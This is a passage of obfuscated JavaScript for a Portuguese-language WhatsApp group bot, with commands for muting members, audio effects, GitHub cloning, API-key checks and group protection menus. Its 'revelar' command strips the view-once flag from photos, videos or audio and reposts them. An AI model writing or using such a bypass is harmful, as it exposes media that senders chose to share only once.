                    _0x3529b0 = _0x4c107d.map(_0x2f77fd => _0x2f77fd.id).indexOf(_0x32e455);
                    _0xc3d45a = _0x4c107d[_0x3529b0];
                    const _0x490a43 = "👤「 *INFORMAÇÕES PERFIL* 」👤\n\n➸ Usuário: *" + _0x55a6ac + "*\n➸ Menção: *@" + _0x32e455.split("@")[0] + "*\n➸ Dispositivo: *" + _0x5e33af + "*\n➸ Bio: *" + _0x440dde + "*\n➸ Status: *" + _0x57b206 + "*\n➸ Moedas: R$ " + Number(_0xc3d45a.saldo).toFixed(2) + "\n➸ Administrador: *" + (_0x150e9e ? "Sim ✓" : "Não ×") + "*\n➸ Premium: *" + (_0x38b1b5 ? "Sim ✓" : "Não ×") + "*\n➸ Advertências: *" + _0xe4f56c + "/3*\n\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\n🍃 *CONSELHO* 🍃\n" + _0x421fc0;
                    const _0x11a040 = {
                      url: ppimg
                    };
                    const _0x554e03 = {
                      image: _0x11a040,
                      caption: _0x490a43,
                      mentions: [_0x32e455]
                    };
                    const _0x40a15f = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x554e03, _0x40a15f);
                  } catch (_0xd1e1e6) {
                    console.log(_0xd1e1e6);
                  }
                } else if (_0x1dcf0a) {
                  _0x403602(_0x386cd9(_0x1dcf0a) + "\n" + cargo2);
                } else {
                  _0x403602("Deu um erro");
                }
              }
              break;
            case "mute":
            case "mutar":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e) {
                return _0x403602(enviar.msg.adm);
              }
              if (!_0x5550bd) {
                return _0x403602("O bot precisa ser adm pra executar essa ação.");
              }
              if (_0x302296.message.extendedTextMessage === undefined || _0x302296.message.extendedTextMessage === null) {
                return _0x403602("Marque o número que deseja mutar.");
              }
              mentioned = _0x302296.message.extendedTextMessage.contextInfo.mentionedJid;
              if (_0x2dd81a.includes(_0x1dcf0a)) {
                return _0x403602("Não sou besta de mutar eu mesmo né 🙁, mas estou decepcionado com você");
              }
              if (JSON.stringify(_0x27033e || numerodono_ofc).indexOf(_0x1dcf0a) >= 0) {
                return _0x403602("Não posso mutar meu dono 🤧");
              }
              if (_0x444027) {
                var _0x981834 = _0xf5b6fe.indexOf(_0x4f1071);
                for (let _0x3ceb40 of mentioned) {
                  teks = "Olá *@" + _0x3ceb40.split("@")[0] + "*, você acaba de ser mutado, ação realizada pelo(a) adm: *@" + _0x32e455.split("@")[0] + "*.";
                  muted[_0x981834].numbers.push(_0x3ceb40);
                }
                fs.writeFileSync("./DADOS/muted.json", JSON.stringify(muted, null, 2));
                teks += "\n–\n• Caso você dar um piu, sua(s) mensagem(ns) vai ser apagada.";
                _0xd7aa55(teks, [mentioned, _0x32e455], true);
              } else {
                const _0x25b474 = {
                  jid: _0x4f1071,
                  numbers: mentioned
                };
                const _0x226960 = _0x25b474;
                muted.push(_0x226960);
                fs.writeFileSync("./DADOS/muted.json", JSON.stringify(muted, null, 2) + "\n");
                for (let _0x4b3098 of mentioned) {
                  teks = "Olá *@" + _0x4b3098.split("@")[0] + "*, você acaba de ser mutado, ação realizada pelo(a) adm: *@" + _0x32e455.split("@")[0] + "*.";
                }
                teks += "\n–\n• Caso você dar um piu, sua(s) mensagem(ns) vai ser apagada.";
                _0xd7aa55(teks, [mentioned, _0x32e455], true);
              }
              break;
            case "desmute":
            case "desmutar":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e) {
                return _0x403602(enviar.msg.adm);
              }
              if (!_0x5550bd) {
                return _0x403602("O bot precisa ser adm pra executar essa ação.");
              }
              if (_0x302296.message.extendedTextMessage === undefined || _0x302296.message.extendedTextMessage === null) {
                return _0x403602("Marque o número que deseja desmutar.");
              }
              mentioned = _0x302296.message.extendedTextMessage.contextInfo.mentionedJid;
              var _0x981834 = _0xf5b6fe.indexOf(_0x4f1071);
              if (_0x444027) {
                for (let _0x44dbc4 of mentioned) {
                  if (muted[_0x981834].numbers.indexOf(_0x44dbc4) >= 0) {
                    var _0x108a93 = muted[_0x981834].numbers.indexOf(_0x44dbc4);
                    muted[_0x981834].numbers.splice(_0x108a93, 1);
                  }
                }
                fs.writeFileSync("./DADOS/muted.json", JSON.stringify(muted, null, 2) + "\n");
                for (let _0x104f25 of mentioned) {
                  teks = "Olá usuário *@" + _0x104f25.split("@")[0] + "* você acaba de ser desmutado pelo(a) adm *@" + _0x32e455.split("@")[0] + "*.";
                }
                teks += "\n–\n• Agora você pode falar a vontade no grupo, sem interrupções.";
                _0xd7aa55(teks, [mentioned, _0x32e455], true);
              } else {
                const _0x409ccb = {
                  jid: _0x4f1071,
                  numbers: []
                };
                const _0x152cea = _0x409ccb;
                muted.push(_0x152cea);
                fs.writeFileSync("./DADOS/muted.json", JSON.stringify(muted, null, 2) + "\n");
                for (let _0x36e7f8 of mentioned) {
                  teks = "Olá usuário @" + _0x36e7f8.split("@")[0] + " você acaba de ser desmutado pelo(a) adm @" + _0x32e455.split("@")[0] + ".";
                }
                teks += "\n–\n• Agora você pode falar a vontade no grupo, sem interrupções.";
                _0xd7aa55(teks, [mentioned, _0x32e455], true);
              }
              break;
            case "listaddd":
              if (!_0xd20756) {
                return _0x403602("Somente em grupos");
              }
              if (!_0x150e9e) {
                return _0x403602(enviar.msg.adm);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("*FALE O CÓDIGO DO PAÍS*");
              }
              if (isNaN(_0x40e45c[0])) {
                return _0x403602("*FALE O CÓDIGO DO PAÍS*");
              }
              teks = "NÚMEROS QUE INICIAM EM: \"+" + _0x40e45c[0] + "\"\nQUE ESTÃO NESSE GRUPO\n\n";
              men = [];
              for (let _0x3c5574 of _0x5b3ba6) {
                if (_0x3c5574.id.startsWith(_0x40e45c[0])) {
                  teks += "➤ @" + _0x3c5574.id.split("@")[0] + "\n";
                  men.push(_0x3c5574.id);
                }
              }
              if (teks.indexOf("~>") < 0) {
                return _0x403602("*NENHUM NÚMERO COM AS INICIAIS DE \"+" + _0x40e45c[0] + "\" FOI ENCONTRADO!*");
              }
              const _0x176fd8 = {
                text: teks,
                mentions: men
              };
              _0x263319.sendMessage(_0x4f1071, _0x176fd8);
              break;
            case "reverb":
              if (!_0x6aebb1) {
                return _0x403602("Marque um áudio");
              }
              _0x403602("Aguarde...");
              const _0x40481e = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
              const _0x33c122 = getRandom("." + (await getExtension(_0x40481e.mimetype)));
              const _0x1690aa = getRandom(".mp3");
              const _0x56849a = await getFileBuffer(_0x40481e, "audio");
              fs.writeFileSync(_0x33c122, _0x56849a);
              exec("ffmpeg -i " + _0x33c122 + " -af \"aecho=0.05:0.75:50:0.5\" " + _0x1690aa, (_0x437b2a, _0x2babe2, _0x494e6b) => {
                fs.unlinkSync(_0x33c122);
                if (_0x437b2a) {
                  return _0x403602("Erro!");
                }
                const _0x37540f = fs.readFileSync(_0x1690aa);
                const _0x43dea8 = {
                  audio: _0x37540f,
                  mimetype: "audio/mp4",
                  ptt: true
                };
                const _0x322b58 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x43dea8, _0x322b58);
                fs.unlinkSync(_0x1690aa);
              });
              break;
            case "reverb + slowed":
            case "slowed + reverb":
              if (!_0x6aebb1) {
                return _0x403602("Marque um áudio");
              }
              _0x403602("Aplicando reverb e slowed...");
              const _0x2bfeba = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
              const _0x32384e = getRandom("." + (await getExtension(_0x2bfeba.mimetype)));
              const _0x17ded6 = getRandom(".mp3");
              const _0x13ba68 = getRandom(".mp3");
              const _0x19714e = await getFileBuffer(_0x2bfeba, "audio");
              fs.writeFileSync(_0x32384e, _0x19714e);
              exec("ffmpeg -i " + _0x32384e + " -af \"aecho=0.05:0.75:50:0.5\" " + _0x17ded6, async (_0x478506, _0x2e1d04, _0x40b988) => {
                fs.unlinkSync(_0x32384e);
                if (_0x478506) {
                  return _0x403602("Erro ao aplicar reverb!");
                }
                exec("ffmpeg -i " + _0x17ded6 + " -filter:a \"atempo=0.8,asetrate=44100*0.8\" " + _0x13ba68, async (_0x1896bf, _0x127905, _0x53ddc4) => {
                  fs.unlinkSync(_0x17ded6);
                  if (_0x1896bf) {
                    return _0x403602("Erro ao aplicar slowed!");
                  }
                  const _0x139bf3 = fs.readFileSync(_0x13ba68);
                  const _0x18b3e2 = {
                    audio: _0x139bf3,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x12a63e = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x18b3e2, _0x12a63e);
                  fs.unlinkSync(_0x13ba68);
                });
              });
              break;
            case "slowed":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602(enviar.espere);
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                gem = rane;
                ran = getRandom(".mp3");
                exec("ffmpeg -i " + gem + " -filter:a \"atempo=0.9,asetrate=44100*0.8\" " + ran, (_0x4422db, _0x12898f, _0x10bb25) => {
                  DLT_FL(gem);
                  if (_0x4422db) {
                    return _0x403602("Erro!");
                  }
                  hah = fs.readFileSync(ran);
                  const _0x23c268 = {
                    audio: hah,
                    mimetype: "audio/mp4",
                    ptt: true
                  };
                  const _0x3f6f1b = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x23c268, _0x3f6f1b);
                  DLT_FL(ran);
                });
              } else {
                _0x403602("Marque o áudio..");
              }
              break;
            case "gitclone":
              try {
                _0x403602("Baixando o arquivo, aguarde...");
                let _0x561e8e = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + _0x1d93be + "gitclone https://github.com/bronxys/X.git");
                }
                if (!_0x40e45c[0]) {
                  _0x403602("Exemplo: " + _0x1d93be + "gitclone https://github.com/bronxys/X.git");
                }
                if (!_0x561e8e.test(_0x40e45c[0])) {
                  return _0x403602("Aguarde");
                }
                let [, _0x3b36a2, _0x2a7819] = _0x40e45c[0].match(_0x561e8e) || [];
                _0x2a7819 = _0x2a7819.replace(/.git$/, "");
                let _0x113922 = "https://api.github.com/repos/" + _0x3b36a2 + "/" + _0x2a7819 + "/zipball";
                let _0x29454d = (await fetch(_0x113922, {
                  method: "HEAD"
                })).headers.get("content-disposition").match(/attachment; filename=(.*)/)[1];
                const _0x42836d = {
                  url: _0x113922
                };
                const _0x49c6db = {
                  quoted: _0xa6b34
                };
                _0x263319.sendMessage(_0x4f1071, {
                  document: _0x42836d,
                  fileName: _0x29454d + ".zip",
                  mimetype: "application/zip"
                }, _0x49c6db).catch(_0x444758 => _0x403602("ERROR!!"));
              } catch (_0x5d2f68) {
                return _0x403602("Erro..");
              }
              break;
            case "apikey":
              if (!_0x1d6557) {
                return _0x403602("Por favor, insira a key.");
              }
              try {
                _0x403602("Consultando a apikey...");
                let _0x4883ef = await fetchJson(SITE_JEFF_APIS + "/api/keyerrada?apikey=" + _0x1d6557);
                abcG = "╭─⊣「 *APIKEY* 」 \n\n" + _0x4883ef.message + "\n\n• *Rest:* " + SITE_JEFF_APIS + "\n╰━━━━━━━━━━━━━ ";
                const _0x1140b8 = {
                  text: "" + abcG
                };
                _0x263319.sendMessage(_0x4f1071, _0x1140b8);
              } catch (_0x2e074e) {
                return _0x403602("❌ *Apikey inexistente ou não encontrada*");
                const _0x4adc5d = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x4bdfb8 = {
                  react: _0x4adc5d
                };
                _0x263319.sendMessage(_0x4f1071, _0x4bdfb8);
              }
              break;
            case "revelar":
              if (!_0x346bc2 && !_0x330150) {
                return _0x403602("Marque uma foto, vídeo ou áudio em visualização única.");
              }
              try {
                _0x1b86ad(_0x4f1071, "👀");
                let _0x56e895 = _0x302296.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                if (JSON.stringify(_0x302296).includes("videoMessage")) {
                  let _0x4a9f83 = _0x56e895?.videoMessage || _0x302296.message?.videoMessage || _0x56e895?.viewOnceMessageV2?.message?.videoMessage || _0x302296.message?.viewOnceMessageV2?.message?.videoMessage || _0x302296.message?.viewOnceMessage?.message?.videoMessage || _0x56e895?.viewOnceMessage?.message?.videoMessage;
                  _0x4a9f83.viewOnce = false;
                  _0x4a9f83.video = {
                    url: _0x4a9f83.url
                  };
                  _0x4a9f83.caption += "";
                  _0x263319.sendMessage(_0x4f1071, _0x4a9f83);
                } else if (JSON.stringify(_0x302296).includes("audioMessage")) {
                  let _0x214738 = _0x56e895?.audioMessage || _0x302296.message?.audioMessage || _0x56e895?.viewOnceMessageV2Extension?.message?.audioMessage || _0x302296.message?.viewOnceMessageV2Extension?.message?.audioMessage || _0x302296.message?.viewOnceMessage?.message?.audioMessage || _0x56e895?.viewOnceMessage?.message?.audioMessage;
                  _0x214738.viewOnce = false;
                  _0x214738.audio = {
                    url: _0x214738.url
                  };
                  _0x214738.caption += "";
                  _0x263319.sendMessage(_0x4f1071, _0x214738);
                } else {
                  let _0x43b643 = _0x56e895?.imageMessage || _0x302296.message?.imageMessage || _0x56e895?.viewOnceMessageV2?.message?.imageMessage || _0x302296.message?.viewOnceMessageV2?.message?.imageMessage || _0x302296.message?.viewOnceMessage?.message?.imageMessage || _0x56e895?.viewOnceMessage?.message?.imageMessage;
                  _0x43b643.viewOnce = false;
                  _0x43b643.image = {
                    url: _0x43b643.url
                  };
                  _0x43b643.caption += "";
                  _0x263319.sendMessage(_0x4f1071, _0x43b643);
                }
              } catch (_0x15c829) {
                _0x403602("Ocorreu um erro ao tentar revelar a mensagem de visualização única.");
              }
              break;
            case "checkapi":
              try {
                await _0x403602("🔎 *Verificando Api* 🔍\n🌐 Verificando à Api:\n↪️ " + SITE_JEFF_APIS + "\n🌹 My Rest Oficial\nAguarde eu ter uma resposta... 🤡");
                await sleep(1200);
                axios.get(SITE_JEFF_APIS + "/api/keyerrada?apikey=" + _0x512d5e).then(_0x55967c => {
                  _0x403602("Status da Api: Ativada ✅\nNão encontrei nenhum erro na api 🙂");
                }).catch(_0x194996 => {
                  _0x403602("Status da Api: Offline ❌\nEncontrei um erro na api 404 😰");
                });
              } catch (_0x409bb1) {
                if (String(_0x409bb1).includes("invalid json response body at")) {
                  console.log("Status da Api: Desativada ❌\nEncontrei  um erro na api 😰");
                }
              }
              break;
            case "menu":
              try {
                if (_0x351d91) {
                  const _0x2faaea = await fs.readFileSync("./DADOS/usuarios/audios/menucmd.mp3");
                  const _0x58755d = {
                    audio: _0x2faaea
                  };
                  const _0x5b5b78 = {
                    mimetype: "audio/mp3",
                    ptt: true,
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x58755d, _0x5b5b78);
                  await sleep(1500);
                }
                if (botoes_) {
                  await _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: {
                        text: menubotao(_0x1d93be, NomeDoBot, dayy, _0x532a11, _0x38b1b5, H, D, _0x6965b0, _0x5e33af, versão, botoes_, _0x32e455)
                      },
                      footer: {
                        text: sub_menu(_0x1d93be, _0x32e455)
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: botao_menu(_0x1d93be, _0x32e455),
                            sections: [{
                              title: "Escolha Um Botão De Acordo Com Sua Necessidade.",
                              rows: [{
                                id: _0x1d93be + "cmds_de_membros",
                                title: comandos_de_membros(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menudono",
                                title: menu_dono(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "ativacoes_dono",
                                title: ativacoes_dono(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menud",
                                title: menu_adm(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "ativacoes_adm",
                                title: ativacoes_adm(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menupremium",
                                title: menu_premium(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "efeitosimg",
                                title: menu_efeitos(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "logos",
                                title: menu_logos(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "alteradoress",
                                title: efeitos_audio_videos(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "brincadeiras",
                                title: menu_brincadeiras(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "fotoshop",
                                title: menu_fotoshop(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menurpg",
                                title: menu_rpg(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menuinfos",
                                title: menu_infos(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menuia",
                                title: inteligencia_artificial(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menudownloads",
                                title: menu_downloads(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "Informacoes",
                                title: menu_informacoes(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menujogos",
                                title: menu_jogos(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menufigurinhas",
                                title: menu_figurinhas(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "downloadjogos",
                                title: jogos_apks(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "menunsfw",
                                title: menu_nsfw(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "puxadas",
                                title: menu_puxadas(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "ping",
                                title: ping(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "dono",
                                title: dono(_0x1d93be, _0x32e455)
                              }, {
                                id: _0x1d93be + "criador",
                                title: "🧙‍♂️ CRIADOR DO BOT 🧙‍♂️"
                              }, {
                                id: _0x1d93be + "avalie",
                                title: avalie(_0x1d93be, _0x32e455)
                              }]
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x4b9efe = {
                    url: logoslink.logo
                  };
                  const _0x507200 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    image: _0x4b9efe,
                    caption: menu(_0x1d93be, NomeDoBot, dayy, _0x532a11, _0x32e455, _0x38b1b5, H, D, lermais, _0x6965b0, _0x5e33af, botoes_)
                  }, _0x507200);
                }
              } catch (_0x2e82ac) {
                console.log(_0x2e82ac);
                _0x403602(_0x2e82ac);
              }
              break;
            case "z":
              {
                const _0x1a3f9c = {
                  jid: _0x32e455
                };
                const _0x1a4f4a = {
                  participant: _0x1a3f9c
                };
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: {
                      text: "KD A BCT?"
                    },
                    footer: {
                      text: "@jefferson_ddos"
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "o",
                          sections: [{
                            title: "menu",
                            highlight_label: "a",
                            rows: [{
                              id: "" + _0x1d93be,
                              header: "titulo",
                              title: "ya",
                              description: "tua"
                            }]
                          }]
                        })
                      }]
                    }
                  }
                }, _0x1a4f4a);
              }
              break;
            case "g":
              try {
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: {
                      text: "KD A BCT?"
                    },
                    footer: {
                      text: "@jefferson_ddos"
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "Menu",
                          sections: [{
                            title: "menu",
                            rows: [{
                              id: _0x1d93be + "s",
                              header: "Menu Principal",
                              title: "menu"
                            }, {
                              id: _0x1d93be + "menuadm",
                              header: "Menu Adm",
                              title: "Menu Adm"
                            }]
                          }]
                        })
                      }]
                    }
                  }
                }, {});
              } catch (_0xfda033) {
                _0x403602(_0xfda033);
              }
              break;
            case "ativacoes_adm":
            case "ativações_adm":
            case "ativarcmds":
            case "ativacoes":
              try {
                if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                  return _0x403602(_0x5c594c);
                }
                if (!_0x5550bd) {
                  return _0x403602(_0x4c16a9);
                }
                if (botoes_) {
                  const _0x21e3b4 = {
                    text: "PROTEÇÕES E ATIVAÇÕES DO GRUPO\n\nAdministrador : " + _0x55a6ac + "\n"
                  };
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: _0x21e3b4,
                      footer: {
                        text: "Ative *Conscientemente* sobre o que cada função faz.."
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "Comandos de Ativar",
                            sections: [{
                              title: "Lista de Funções..",
                              rows: [{
                                id: "" + (!_0x51b3b7 ? _0x1d93be + "antilink 1" : _0x1d93be + "antilink 0"),
                                title: "" + (!_0x51b3b7 ? "Ativar - Proteção Contra Envio de Links.." : "Desativar - Proteção Contra Envio de Links..")
                              }, {
                                id: "" + (!_0x4994fc ? _0x1d93be + "antinotas 1" : _0x1d93be + "antinotas 0"),
                                title: "" + (!_0x4994fc ? "Ativar - proteção contra envio de notas fake.." : "Desativar - proteção contra envio de notas fake...")
                              }, {
                                id: "" + (!_0x74ce95 ? _0x1d93be + "limitecaracteres 1" : _0x1d93be + "limitecaracteres 0"),
                                title: "" + (!_0x74ce95 ? "Ativar - limite de caracteres.." : "Desativar - limite de caracteres...")
                              }, {
                                id: "" + (!_0x1a630f ? _0x1d93be + "antifake 1" : _0x1d93be + "antifake 0"),
                                title: "" + (!_0x1a630f ? "Ativar - proteção contra estrangeiros.." : "Desativar - proteção contra estrangeiros..")
                              }, {
                                id: "" + (!_0x169982 ? _0x1d93be + "anticatalogo 1" : _0x1d93be + "anticatalogo 0"),
                                title: "" + (!_0x169982 ? "Ativar - para remoção de catálogo..." : "Desativar - para remoção de catálogo...")
                              }, {
                                id: "" + (!_0x51863c ? _0x1d93be + "antiloc 1" : _0x1d93be + "antiloc 0"),
                                title: "" + (!_0x51863c ? "Ativar - para remoção de Localização..." : "Desativar - para remoção de Localização...")
                              }, {
                                id: "" + (!_0xec937a ? _0x1d93be + "x9 1" : _0x1d93be + "x9 0"),
                                title: "" + (!_0xec937a ? "Ativar o x9 - de alteração de cargo de adm.." : "Desativar - o x9 de alteração de cargo administrativo..")
                              }, {
                                id: "" + (!_0x1d56ff ? _0x1d93be + "x9visuunica 1" : _0x1d93be + "x9visuunica 0"),
                                title: "" + (!_0x1d56ff ? "Ativar o x9 de visu-única.." : "Desativar o x9 de visu-única..")
                              }, {
                                id: "" + (!_0x23cd8e ? _0x1d93be + "modobrincadeira 1" : _0x1d93be + "modobrincadeira 0"),
                                title: "" + (!_0x23cd8e ? "Ativar - o modo brincadeira.." : "Desativar - o modo brincadeira..")
                              }, {
                                id: "" + (!_0x44ddae ? _0x1d93be + "antilinkgp 1" : _0x1d93be + "antilinkgp 0"),
                                title: "" + (!_0x44ddae ? "Ativar - proteção contra envio de links de gp.." : "Desativar - proteção contra envio de links de gp..")
                              }, {
                                id: "" + (!_0x1146e6 ? _0x1d93be + "bemvindo 1" : _0x1d93be + "bemvindo 0"),
                                title: "" + (!_0x1146e6 ? "Ativar - o Bem Vindo para novatos.." : "Desativar - o Bem Vindo para novatos..")
                              }, {
                                id: "" + (!_0x57d1c4 ? _0x1d93be + "bemvindo2 1" : _0x1d93be + "bemvindo2 0"),
                                title: "" + (!_0x57d1c4 ? "Ativar - o Bem Vindo2 para novatos.." : "Desativar - o Bem Vindo para novatos..")
                              }, {
                                id: "" + (!_0x53df47 ? _0x1d93be + "antivideo 1" : _0x1d93be + "antivideo 0"),
                                title: "" + (!_0x53df47 ? "Ativar - para remoção de vídeos..." : "Desativar - para remoção de vídeos...")
                              }, {
                                id: "" + (!_0x416e68 ? _0x1d93be + "antiimg 1" : _0x1d93be + "antiimg 0"),
                                title: "" + (!_0x416e68 ? "Ativar - para remoção de imagem..." : "Desativar - para remoção de imagem...")
                              }, {
                                id: "" + (!_0xb6a765 ? _0x1d93be + "antiaudio 1" : _0x1d93be + "antiaudio 0"),
                                title: "" + (!_0xb6a765 ? "Ativar - para remoção de audio..." : "Desativar - para remoção de audio...")
                              }, {
                                id: "" + (!_0x399715 ? _0x1d93be + "anticontato 1" : _0x1d93be + "anticontato 0"),
                                title: "" + (!_0x399715 ? "Ativar - para remoção de VCARD/CONTATO..." : "Desativar - para remoção de VCARD/CONTATO...")
                              }, {
                                id: "" + (!_0x4233ab ? _0x1d93be + "antisticker 1" : _0x1d93be + "antisticker 0"),
                                title: "" + (!_0x4233ab ? "Ativar - para remoção de figurinhas..." : "Desativar - para remoção de figurinhas...")
                              }, {
                                id: "" + (!_0x47a927 ? _0x1d93be + "autofigu 1" : _0x1d93be + "autofigu 0"),
                                title: "" + (!_0x47a927 ? "Ativar - cmd de fazer figurinha automática.." : "Desativar - cmd de fazer figurinha auto...")
                              }, {
                                id: "" + (!_0x452d71 ? _0x1d93be + "simih2 1" : _0x1d93be + "simih2 0"),
                                title: "" + (!_0x452d71 ? "Ativar - IA2 de conversar no grupo.." : "Desativar - IA2 de conversar no grupo.....")
                              }, {
                                id: "" + (!_0x12f03b ? _0x1d93be + "simih 1" : _0x1d93be + "simih 0"),
                                title: "" + (!_0x12f03b ? "Ativar - IA de conversar no grupo.." : "Desativar - IA de conversar no grupo.....")
                              }, {
                                id: "" + (!_0x193ccd ? _0x1d93be + "autorepo 1" : _0x1d93be + "autorepo 0"),
                                title: "" + (!_0x193ccd ? "Ativar - Auto resposta.." : "Desativar - auto resposta..")
                              }, {
                                id: "" + (!_0x48c5d7 ? _0x1d93be + "autotext 1" : _0x1d93be + "autotext 0"),
                                title: "" + (!_0x48c5d7 ? "Ativar - Auto Transcrição de áudios neste grupo" : "Desativar - Auto Transcrição de áudios neste grupo")
                              }, {
                                id: "" + (!_0x340531 ? _0x1d93be + "autobaixar 1" : _0x1d93be + "autobaixar 0"),
                                title: "" + (!_0x340531 ? "Ativar Auto - Baixar Midias Sociais neste grupo" : "Desativar - Auto Baixar Midias Sociais neste grupo")
                              }, {
                                id: "" + (!_0x367ec0 ? _0x1d93be + "antidoc 1" : _0x1d93be + "antidoc 0"),
                                title: "" + (!_0x367ec0 ? "Ativar - proteção contra envio de documentos.." : "Desativar - proteção contra envio de documentos")
                              }, {
                                id: "" + (!_0x2cc1b9 ? _0x1d93be + "antiporno 1" : _0x1d93be + "antiporno 0"),
                                title: "" + (!_0x2cc1b9 ? "Ativar - proteção contra envio de Imagens +18" : "Desativar - proteção contra envio de notas fake...")
                              }, {
                                id: "" + (!_0x3c37ec ? _0x1d93be + "antipalavrao 1" : _0x1d93be + "antipalavrao 0"),
                                title: "" + (!_0x3c37ec ? "Ativar - proteção contra envio de Palavrões..." : "Desativar - proteção contra envio de Palavrões...")
                              }, {
                                id: "" + (!_0x4c8b57 ? _0x1d93be + "modonsfw 1" : _0x1d93be + "modonsfw 0"),
                                title: "" + (!_0x4c8b57 ? "Ativar - Modo +18 nesse grupo..." : "Desativar - Modo +18 nesse grupo...")
                              }, {
                                id: "" + (!_0x589394 ? _0x1d93be + "modorpg 1" : _0x1d93be + "modorpg 0"),
                                title: "" + (!_0x589394 ? "Ativar - Modo rpg nesse grupo..." : "Desativar - Modo rpg nesse grupo")
                              }, {
                                id: "" + (!_0x4df73d ? _0x1d93be + "autoadm 1" : _0x1d93be + "autoadm 0"),
                                title: "" + (!_0x4df73d ? "Ativar - Modo Comandos de Adms sem Prefixo nesse grupo..." : "Desativar - Modo Comandos de Adms sem Prefixo  nesse grupo")
                              }, {
                                id: "" + (!_0x24bf3d ? _0x1d93be + "antirequest 1" : _0x1d93be + "antirequest 0"),
                                title: "" + (!_0x24bf3d ? "Ativar - Anti request (anti div de bots) nesse grupo..." : "Desativar - Anti request (anti div de bots) nesse grupo...")
                              }]
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  const _0x4f7a95 = {
                    url: logoslink.logo
                  };
                  const _0x39f870 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, {
                    image: _0x4f7a95,
                    caption: ativacoesadm(_0x1d93be, _0x51b3b7, _0x4994fc, _0x74ce95, _0x1a630f, _0x169982, _0x51863c, _0xec937a, _0x1d56ff, _0x23cd8e, _0x44ddae, _0x1146e6, _0x57d1c4, _0x53df47, _0x416e68, _0xb6a765, _0x399715, _0x4233ab, _0x47a927, _0x12f03b, _0x452d71, _0x193ccd, _0x48c5d7, _0x340531, _0x367ec0, _0x2cc1b9, _0x3c37ec, _0x4c8b57, _0x589394, _0x4df73d, _0x24bf3d, _0x32e455)
                  }, _0x39f870);
                }
              } catch (_0x424b99) {
                console.log(_0x424b99);
              }
              break;
            case "w":
              try {
                const _0x3f68ec = {
                  text: "PROTECOES DE GRUPOS\n\nAdministrador : " + _0x55a6ac + "\n"
                };
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: _0x3f68ec,
                    footer: {
                      text: "Ative *Conscientemente* sobre o que cada função faz.."
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "Comandos de Ativar",
                          sections: [{
